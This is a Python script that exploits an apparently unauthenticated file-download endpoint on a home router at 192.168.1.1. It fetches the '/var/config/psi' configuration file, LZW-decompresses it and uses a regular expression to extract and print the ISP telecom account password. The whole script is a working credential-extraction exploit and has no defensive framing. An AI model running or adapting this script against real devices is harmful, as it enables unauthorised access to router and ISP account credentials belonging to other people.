import lzw
import re
import sys
import requests
import logging as log

# log.basicConfig(format="%(levelname)s: %(message)s", level=log.INFO)

IP = "192.168.1.1"
header_pattern = r'<compressed alg=lzw len=(\d+)>.+<crc=0x([0-9A-Fa-f]+)>'
password_pattern = r'<X_CT-COM_TeleComAccount>.*\n.*<Password>(.*)</Password>'

response = requests.get("http://" + IP + "/downloadFile?file=/var/config/psi")
assert response.status_code == 200

data = response.content
header = data[:60]

match = re.search(header_pattern, str(header))
data_len = int(match.group(1))
compressed_data = data[60:60 + data_len]

try:
    # the file has multiple "pages" so we need to use the "PagingDecoder" here
    decoder = lzw.PagingDecoder(initial_code_size=258)
    log.info("LZW Decompressing data...")
    r = b"".join([b"".join(pg) for pg in decoder.decodepages(compressed_data)])
    r = r.decode()
    log.info("OK.")
    match = re.search(password_pattern, str(r))
    print("Password is: " + match.group(1))
except Exception as e:
    log.info(e)
    log.info("Data decompression failed! Possible file corruption.")
    sys.exit(1)
